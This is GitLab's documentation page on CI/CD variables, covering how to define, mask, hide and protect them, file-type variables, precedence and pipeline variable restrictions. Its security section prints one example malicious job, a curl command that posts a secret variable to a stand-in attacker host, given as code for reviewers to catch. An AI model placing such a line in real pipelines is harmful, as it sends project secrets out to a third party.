# GitLab CI/CD variables | GitLab Docs

Source: https://docs.gitlab.com/ci/variables/#use-pipeline-variables

GitLab CI/CD variables | GitLab Docs
GitLab CI/CD variables
Tier
: Free, Premium, Ultimate
Offering
: GitLab.com, GitLab Self-Managed, GitLab Dedicated
CI/CD variables are a type of environment variable. You can use them to:
Control the behavior of jobs and pipelines.
Store values you want to re-use, for example in
job scripts
.
Avoid hard-coding values in your
.gitlab-ci.yml
file.
Variable names are limited by the
shell the runner uses
to execute scripts. Each shell has its own set of reserved variable names.
To ensure consistent behavior, you should always put variable values in single or double quotes.
Variables are internally parsed by the
Psych YAML parser
,
so quoted and unquoted variables might be parsed differently. For example,
VAR1: 012345
is interpreted as an octal value, so the value becomes
5349
, but
VAR1: "012345"
is parsed
as a string with a value of
012345
.
For more information about advanced use of GitLab CI/CD, see
7 advanced GitLab CI workflow hacks
shared by GitLab engineers.
Predefined CI/CD variables
GitLab CI/CD makes a set of
predefined CI/CD variables
available for use in pipeline configuration and job scripts. These variables contain
information about the job, pipeline, and other values you might need when the pipeline
is triggered or running.
You can use predefined CI/CD variables in your
.gitlab-ci.yml
without declaring them first.
For example:
job1
:
stage
:
test
script
:
-
echo "The job's stage is '$CI_JOB_STAGE'"
The script in this example outputs
The job's stage is 'test'
.
Define a CI/CD variable in the
.gitlab-ci.yml
file
To create a CI/CD variable in the
.gitlab-ci.yml
file, define the variable and
value with the
variables
keyword.
Variables saved in the
.gitlab-ci.yml
file are visible to all users with access to
the repository, and should store only non-sensitive project configuration. For example,
the URL of a database saved in a
DATABASE_URL
variable. Sensitive variables containing values
like secrets or keys should be added in the UI.
You can define
variables
in:
A job: The variable is only available in that job’s
script
,
before_script
, or
after_script
sections, and with some
job keywords
.
The top-level of the
.gitlab-ci.yml
file: The variable is available as a default for all jobs in a pipeline, unless a job defines a variable with the same name. The job’s variable takes precedence.
In both cases, you cannot use these variables with
global keywords
.
For example:
variables
:
ALL_JOBS_VAR
:
"A default variable"
job1
:
variables
:
JOB1_VAR
:
"Job 1 variable"
script
:
-
echo "Variables are '$ALL_JOBS_VAR' and '$JOB1_VAR'"
job2
:
variables
:
ALL_JOBS_VAR
:
"Different value than default"
JOB2_VAR
:
"Job 2 variable"
script
:
-
echo "Variables are '$ALL_JOBS_VAR', '$JOB2_VAR', and '$JOB1_VAR'"
In this example:
job1
outputs:
Variables are 'A default variable' and 'Job 1 variable'
job2
outputs:
Variables are 'Different value than default', 'Job 2 variable', and ''
Use the
value
and
description
keywords to define
variables that are prefilled
for manually-triggered pipelines.
Skip default variables in a single job
If you don’t want default variables to be available in a job, set
variables
to
{}
:
variables
:
DEFAULT_VAR
:
"A default variable"
job1
:
variables
:
{}
script
:
-
echo This job does not need any variables
Define a CI/CD variable in the UI
Sensitive variables like tokens or passwords should be stored in the settings in the UI,
not in the
.gitlab-ci.yml
file.
By default, pipelines from forked projects can’t access the CI/CD variables available to the parent project.
If you
run a merge request pipeline in the parent project for a merge request from a fork
,
all variables become available to the pipeline.
For a project
You can add CI/CD variables to a project’s settings. Projects can have a maximum of 8000 CI/CD variables.
Prerequisites:
You must be a project member with the Maintainer role.
To add or update variables in the project settings:
On the left sidebar, select
Search or go to
and find your project. If you’ve
turned on the new navigation
, this field is on the top bar.
Select
Settings
>
CI/CD
.
Expand
Variables
.
Select
Add variable
and fill in the details:
Key
: Must be one line, with no spaces, using only letters, numbers, or
_
.
Value
: The value is limited to 10,000 characters, but also bounded by any limits in the
runner’s operating system. The value has extra limitations if
Visibility
is set to
Masked
or
Masked and hidden
.
Type
:
Variable
(default) or
File
.
Environment scope
: Optional.
All (default)
(
*
), a specific
environment
,
or a wildcard environment scope.
Protect variable
Optional. If selected, the variable is only available in pipelines
that run on protected branches or protected tags.
Visibility
: Select
Visible
(default),
Masked
, or
Masked and hidden
.
Expand variable reference
: Optional. If selected, the variable can reference another variable.
It is not possible to reference another variable if
Visibility
is set to
Masked
or
Masked and hidden
.
Alternatively, project variables can be added
by using the API
.
For a group
You can make a CI/CD variable available to all projects in a group. Groups can have a maximum of 30000 CI/CD variables.
Prerequisites:
You must be a group member with the Owner role.
To add a group variable:
On the left sidebar, select
Search or go to
and find your group. If you’ve
turned on the new navigation
, this field is on the top bar.
Select
Settings
>
CI/CD
.
Expand
Variables
.
Select
Add variable
and fill in the details:
Key
: Must be one line, with no spaces, using only letters, numbers, or
_
.
Value
: The value is limited to 10,000 characters, but also bounded by any limits in the
runner’s operating system. The value has extra limitations if
Visibility
is set to
Masked
or
Masked and hidden
.
Type
:
Variable
(default) or
File
.
Protect variable
Optional. If selected, the variable is only available in pipelines
that run on protected branches or protected tags.
Visibility
: Select
Visible
(default),
Masked
,
Masked and hidden
.
Expand variable reference
: Optional. If selected, the variable can reference another variable.
It is not possible to reference another variable if
Visibility
is set to
Masked
or
Masked and hidden
.
The group variables that are available in a project are listed in the project’s
Settings > CI/CD > Variables
section. Variables from subgroups are recursively inherited.
Alternatively, group variables can be added
by using the API
.
Environment scope
Tier
: Premium, Ultimate
To set a group CI/CD variable to only be available for certain environments:
On the left sidebar, select
Search or go to
and find your group. If you’ve
turned on the new navigation
, this field is on the top bar.
Select
Settings
>
CI/CD
.
Expand
Variables
.
To the right of the variable, select
Edit
(
pencil
).
For
Environment scope
, select
All (default)
(
*
), a specific
environment
,
or a wildcard environment scope.
For an instance
Tier
: Free, Premium, Ultimate
Offering
: GitLab Self-Managed, GitLab Dedicated
You can make a CI/CD variable available to all projects and groups in a GitLab instance.
Prerequisites:
You must have administrator access to the instance.
To add an instance variable:
On the left sidebar, at the bottom, select
Admin
. If you’ve
turned on the new navigation
, in the upper-right corner, select your avatar and then select
Admin
.
Select
Settings
>
CI/CD
.
Expand
Variables
.
Select
Add variable
and fill in the details:
Key
: Must be one line, with no spaces, using only letters, numbers, or
_
.
Value
: The value is limited to 10,000 characters, but also bounded by any limits in the
runner’s operating system. No other limitations if
Visibility
set to
Visible
.
Type
:
Variable
(default) or
File
.
Protect variable
Optional. If selected, the variable is only available in pipelines
that run on protected branches or tags.
Visibility
: Select
Visible
(default),
Masked
, or
Masked and hidden
.
Expand variable reference
: Optional. If selected, the variable can reference another variable.
It is not possible to reference another variable if
Visibility
is set to
Masked
or
Masked and hidden
.
Alternatively, instance variables can be added
by using the API
.
CI/CD variable security
Code pushed to the
.gitlab-ci.yml
file could compromise your variables. Variables could
be accidentally exposed in a job log, or maliciously sent to a third party server.
Review all merge requests that introduce changes to the
.gitlab-ci.yml
file before you:
Run a pipeline in the parent project for a merge request submitted from a forked project
.
Merge the changes.
Review the
.gitlab-ci.yml
file of imported projects before you add files or run pipelines against them.
The following example shows malicious code in a
.gitlab-ci.yml
file:
accidental-leak-job
:
script
:
# Password exposed accidentally
-
echo "This script logs into the DB with $USER $PASSWORD"
-
db-login $USER $PASSWORD
malicious-job
:
script
:
# Secret exposed maliciously
-
curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
To help reduce the risk of accidentally leaking secrets through scripts like in
accidental-leak-job
,
all variables containing sensitive information should always be masked in job logs.
You can also
limit a variable to protected branches and tags only
.
Alternatively,
connect with an external secrets management provider
to store and retrieve secrets.
Malicious scripts like in
malicious-job
must be caught during the review process.
Reviewers should never trigger a pipeline when they find code like this, because
malicious code can compromise both masked and protected variables.
Variable values are encrypted using
aes-256-cbc
and stored in the database. This data can be read and decrypted with a
valid
secrets file
.
Mask a CI/CD variable
Masking a CI/CD variable is not a guaranteed way to prevent malicious users from
accessing variable values. To ensure security of sensitive information,
consider using
external secrets
and
file type variables
to prevent commands such as
env
or
printenv
from printing secret variables.
You can mask a CI/CD variable for a project, group, or instance to prevent
its value from appearing in job logs. When a job outputs the value of a
masked variable, the value is replaced with
[MASKED]
in the job log.
In some cases, the
[MASKED]
value could be followed by
x
characters as well.
Prerequisites:
You must have the same role or access level as required to
add a CI/CD variable in the UI
.
To mask a variable:
For the group, project, or in the
Admin
area, select
Settings
>
CI/CD
.
Expand
Variables
.
Next to the variable you want to protect, select
Edit
.
Under
Visibility
, select
Mask variable
.
Recommended. Clear the
Expand variable reference
checkbox.
If variable expansion is enabled, the only non-alphanumeric characters you can use in
the variable value are:
_
,
:
,
@
,
-
,
+
,
.
,
~
,
=
,
/
, and
~
.
When the setting is disabled, all characters can be used.
Select
Update variable
.
The value of the variable must:
Be a single line with no spaces.
Be 8 characters or longer.
Not match the name of an existing predefined or custom CI/CD variable.
If a process outputs the value in a slightly modified way, the value can’t be masked.
For example, if the shell adds
\
to escape special characters, the value isn’t masked:
Example masked variable value:
My[value]
This output would not be masked:
My\[value\]
When
CI_DEBUG_SERVICES
is enabled, the variable value might be revealed. For more information, see
service container logging
.
Hide a CI/CD variable
History
Introduced
in GitLab 17.4
with a flag
named
ci_hidden_variables
. Enabled by default.
Generally available
in GitLab 17.6. Feature flag
ci_hidden_variables
removed.
In addition to masking, you can also prevent the value of CI/CD variables from being revealed
in the
CI/CD
settings page. Hiding a variable is only possible when creating a new variable,
you cannot update an existing variable to be hidden.
Prerequisites:
You must have the same role or access level as required to
add a CI/CD variable in the UI
.
The variable value must match the
requirements for masked variables
.
To hide a variable, select
Masked and hidden
in the
Visibility
section when
you
add a new CI/CD variable in the UI
.
After you save the variable, the variable can be used in CI/CD pipelines, but cannot
be revealed in the UI again.
Protect a CI/CD variable
You can configure a project, group, or instance CI/CD variable to be available
only to pipelines that run on
protected branches
or
protected tags
.
Merged results pipelines and merge request pipelines can
optionally access protected variables
.
Prerequisites:
You must have the same role or access level as required to
add a CI/CD variable in the UI
.
To set a variable as protected:
For the project or group, go to
Settings
>
CI/CD
.
Expand
Variables
.
Next to the variable you want to protect, select
Edit
.
Select the
Protect variable
checkbox.
Select
Update variable
.
The variable is available for all subsequent pipelines.
Use file type CI/CD variables
All predefined CI/CD variables and variables defined in the
.gitlab-ci.yml
file
are “variable” type (
"variable_type": "env_var"
in the API
).
Variable type variables:
Consist of a key and value pair.
Are made available in jobs as environment variables, with:
The CI/CD variable key as the environment variable name.
The CI/CD variable value as the environment variable value.
Project, group, and instance CI/CD variables are “variable” type by default, but can
optionally be set as a “file” type (
"variable_type": "file"
in the API).
File type variables:
Consist of a key, value, and file.
Are made available in jobs as environment variables, with:
The CI/CD variable key as the environment variable name.
The CI/CD variable value saved to a temporary file.
The path to the temporary file as the environment variable value.
Use file type CI/CD variables for tools that need a file as input.
For example, the AWS CLI and
kubectl
are both tools that use
File
type variables for configuration.
If you are using
kubectl
with:
A variable with a key of
KUBE_URL
and
https://example.com
as the value.
A file type variable with a key of
KUBE_CA_PEM
and a certificate as the value.
Pass
KUBE_URL
as a
--server
option, which accepts a variable, and pass
$KUBE_CA_PEM
as a
--certificate-authority
option, which accepts a path to a file:
kubectl config set-cluster e2e --server
=
"
$KUBE_URL
"
--certificate-authority
=
"
$KUBE_CA_PEM
"
Use a
.gitlab-ci.yml
variable as a file type variable
You cannot set a CI/CD variable
defined in the
.gitlab-ci.yml
file
as a file type variable. If you have a tool that requires a file path as an input,
but you want to use a variable defined in the
.gitlab-ci.yml
:
Run a command that saves the value of the variable in a file.
Use that file with your tool.
For example:
variables
:
SITE_URL
:
"https://gitlab.example.com"
job
:
script
:
-
echo "$SITE_URL" > "site-url.txt"
-
mytool --url-file="site-url.txt"
Allow CI/CD variable expansion
History
Expand variable
option
renamed
to
Expand variable reference
in GitLab 16.3.
Changed
to disabled by default in GitLab 18.6.
You can set a variable to treat values with the
$
character as a reference to another variable.
When the pipeline runs, the reference expands to use the value of the referenced variable.
CI/CD variables defined in the UI are not expanded by default. For CI/CD variables defined in
the
.gitlab-ci.yml
file, control variable expansion with the
variables:expand
keyword
.
Prerequisites:
You must have the same role or access level as required to
add a CI/CD variable in the UI
.
To enable variable expansion for the variable:
For the project or group, go to
Settings
>
CI/CD
.
Expand
Variables
.
Next to the variable you want to do not want expanded, select
Edit
.
Select the
Expand variable reference
checkbox.
Select
Update variable
.
Do not
mask
a variable value if you want to use variable expansion.
If both masking and variable expansion are combined, character limitations prevent
the use of the
$
to reference other variables.
CI/CD variable precedence
History
Scan Execution Policies variable precedence was
changed
in GitLab 16.7
with a flag
named
security_policies_variables_precedence
. Enabled by default.
Feature flag removed in GitLab 16.8
.
You can use CI/CD variables with the same name in different places, but the values
can overwrite each other. The type of variable and where they are defined determines
which variables take precedence.
The order of precedence for variables is (from highest to lowest):
Pipeline execution policy variables
.
Scan execution policy variables
.
Pipeline variables
. These variables all have the same precedence:
Variables passed to downstream pipelines.
Trigger variables.
Scheduled pipeline variables.
Manual pipeline variables.
Variables added when creating a pipeline with the API.
Manual job variables.
Project variables.
Group variables. If the same variable name exists in a group and its subgroups,
the job uses the value from the closest subgroup. For example, if you have
Group > Subgroup 1 > Subgroup 2 > Project
, the variable defined in
Subgroup 2
takes precedence.
Instance variables.
Variables from
dotenv
reports
.
Job variables, defined in jobs in the
.gitlab-ci.yml
file.
Default variables for all jobs, defined at the top-level of the
.gitlab-ci.yml
file.
Deployment variables
.
Predefined variables
.
For example:
variables
:
API_TOKEN
:
"default"
job1
:
variables
:
API_TOKEN
:
"secure"
script
:
-
echo "The variable is '$API_TOKEN'"
In this example,
job1
outputs
The variable is 'secure'
because variables defined in jobs in the
.gitlab-ci.yml
file
have higher precedence than default variables.
Use pipeline variables
Pipeline variables are variables that are specified when running a new pipeline.
In
GitLab 17.7
and later,
pipeline inputs
are recommended over passing pipeline variables.
For enhanced security, you should
disable pipeline variables
when using inputs.
Prerequisites:
You must have the Developer role in the project.
You can specify a pipeline variable when you:
Run a pipeline manually
in the UI.
Create a
scheduled pipeline
.
Create a pipeline by using
the
pipelines
API endpoint
.
Create a pipeline by using
the
triggers
API endpoint
.
Use
push options
.
Pass variables to a downstream pipeline by using either the
variables
keyword
,
trigger:forward
keyword
or
dotenv
variables
.
These variables have higher precedence and can override other defined variables,
including predefined variables.
You should avoid overriding predefined variables in most cases, as it can cause the pipeline to behave unexpectedly.
Restrict pipeline variables
History
Introduced
in GitLab 17.1.
For GitLab.com, setting defaults
updated for all new projects in new namespaces
to
no_one_allowed
for
ci_pipeline_variables_minimum_override_role
in GitLab 17.7.
You can limit who can run pipelines with pipeline variables to specific user roles.
When users with a lower role try to use pipeline variables, they receive an
Insufficient permissions to set pipeline variables
error message.
Prerequisites:
You must have the Maintainer role in the project. If the minimum role was previously set to
owner
or
no_one_allowed
, then you must have the Owner role in the project.
To limit the use of pipeline variables to only the Maintainer role and higher:
Go to
Settings > CI/CD > Variables
.
Under
Minimum role to use pipeline variables
, select one of:
no_one_allowed
: No pipelines can run with pipeline variables.
Default for new projects in new namespaces on GitLab.com.
owner
: Only users with the Owner role can run pipelines with pipeline variables.
You must have the Owner role for the project to change the setting to this value.
maintainer
: Only users with at least the Maintainer role can run pipelines with pipeline variables.
Default when not specified on GitLab Self-Managed and GitLab Dedicated.
developer
: Only users with at least the Developer role can run pipelines with pipeline variables.
You can also use
the projects API
to set
the role for the
ci_pipeline_variables_minimum_override_role
setting.
This restriction does not affect the use of CI/CD variables from the project or group settings.
Most jobs can still use the
variables
keyword in the YAML configuration, but not
jobs that use the
trigger
keyword to trigger downstream pipelines. Trigger jobs
pass variables to a downstream pipelines as pipeline variables, which is also controlled
by this setting.
Enable pipeline variable restriction for multiple projects
History
Introduced
in GitLab 18.4.
For groups with many projects, you can disable pipeline variables
in all projects that don’t currently use them. This option sets the
Minimum role to use pipeline variables
setting to
no_one_allowed
for projects
that have never used pipeline variables.
Prerequisites:
You must have the Owner role for the group.
To enable the pipeline variable restriction setting in projects in the group:
On the left sidebar, select
Search or go to
and find your group. If you’ve
turned on the new navigation
, this field is on the top bar.
Select
Settings
>
CI/CD
.
Expand
Variables
.
In the
Disable pipeline variables in projects that don’t use them
section,
select
Start migration
.
The migration runs in the background. You receive an email notification
when the migration is complete. Project maintainers can later change the setting
for their individual projects if needed.
Exporting variables
Scripts executed in separate shell contexts do not share exports, aliases,
local function definitions, or any other local shell updates.
This means that if a job fails, variables created by user-defined scripts are not
exported.
When runners execute jobs defined in
.gitlab-ci.yml
:
Scripts specified in
before_script
and the main script are executed together in
a single shell context, and are concatenated.
Scripts specified in
after_script
run in a shell context completely separate to
the
before_script
and the specified scripts.
Regardless of the shell the scripts are executed in, the runner output includes:
Predefined variables.
Variables defined in:
Instance, group, or project CI/CD settings.
The
.gitlab-ci.yml
file in the
variables:
section.
The
.gitlab-ci.yml
file in the
secrets:
section.
The
config.toml
.
The runner cannot handle manual exports, shell aliases, and functions executed in the body of the script, like
export MY_VARIABLE=1
.
For example, in the following
.gitlab-ci.yml
file, the following scripts are defined:
job
:
variables
:
JOB_DEFINED_VARIABLE
:
"job variable"
before_script
:
-
echo "This is the 'before_script' script"
-
export MY_VARIABLE="variable"
script
:
-
echo "This is the 'script' script"
-
echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
-
echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
-
echo "MY_VARIABLE's value is ${MY_VARIABLE}"
after_script
:
-
echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
-
echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
-
echo "MY_VARIABLE's value is ${MY_VARIABLE}"
When the runner executes the job:
before_script
is executed:
Prints to the output.
Defines the variable for
MY_VARIABLE
.
script
is executed:
Prints to the output.
Prints the value of
JOB_DEFINED_VARIABLE
.
Prints the value of
CI_COMMIT_SHA
.
Prints the value of
MY_VARIABLE
.
after_script
is executed in a new, separate shell context:
Prints to the output.
Prints the value of
JOB_DEFINED_VARIABLE
.
Prints the value of
CI_COMMIT_SHA
.
Prints an empty value of
MY_VARIABLE
. The variable value cannot be detected because
after_script
is in a separate shell context to
before_script
.
Related topics
You can configure
Auto DevOps
to pass CI/CD variables
to a running application. To make a CI/CD variable available as an environment variable in the running application’s container,
prefix the variable key
with
K8S_SECRET_
.
The
Managing the Complex Configuration Data Management Monster Using GitLab
video is a walkthrough of the
Complex Configuration Data Monorepo
working example project. It explains how multiple levels of group CI/CD variables
can be combined with environment-scoped project variables for complex configuration
of application builds or deployments.
The example can be copied to your own group or instance for testing. More details
on what other GitLab CI patterns are demonstrated are available at the project page.
You can
pass CI/CD variables to downstream pipelines
.
Use
trigger:forward
keyword
to specify what type of variables
to pass to the downstream pipeline.
